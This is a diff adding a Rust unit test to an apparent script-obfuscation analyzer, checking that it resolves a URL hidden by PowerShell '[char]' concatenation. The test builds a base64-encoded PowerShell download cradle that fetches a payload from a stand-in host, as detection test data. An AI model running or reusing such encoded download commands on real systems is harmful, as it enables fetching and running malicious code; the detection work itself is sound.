@@ -8410,6 +8410,30 @@ mod ps1_obfuscation_tests {
     }
 
     #[test]
+    fn ps1_char_plus_literal_concat_resolves_url() {
+        use base64::Engine;
+        let inner = r#"(New-Object Net.WebClient).DownloadString([char]104 + 'ttp://ps-char-literal.example/payload')"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://ps-char-literal.example/payload"
+            )
+        });
+        assert!(
+            has,
+            "PowerShell [char] + literal URL concat missed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn ps1_format_double_quoted_resolves_url() {
         use base64::Engine;
         let inner =
